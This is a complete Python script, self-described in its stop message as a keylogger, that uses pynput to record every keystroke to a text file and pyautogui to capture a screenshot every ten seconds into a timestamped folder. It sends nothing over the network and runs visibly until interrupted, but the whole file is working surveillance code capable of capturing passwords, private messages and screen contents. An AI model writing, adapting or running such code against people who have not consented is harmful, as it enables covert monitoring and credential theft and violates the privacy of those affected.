from pynput import keyboard
import pyautogui
import threading
import os
from datetime import datetime
import time
import sys

# Create a timestamped folder
folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
os.makedirs(folder_name, exist_ok=True)

log_file = os.path.join(folder_name, "keystrokes.txt")
running = True  # control flag

def log_keystrokes():
    def on_press(key):
        if not running:
            return False
        try:
            with open(log_file, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a") as f:
                f.write(f" [{key}] ")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def capture_screenshots():
    count = 0
    while running:
        screenshot = pyautogui.screenshot()
        screenshot.save(os.path.join(folder_name, f"screenshot_{count}.png"))
        count += 1
        time.sleep(10)

# Start threads
t1 = threading.Thread(target=log_keystrokes)
t2 = threading.Thread(target=capture_screenshots)

t1.start()
t2.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping keylogger...")
    running = False
    sys.exit(0)
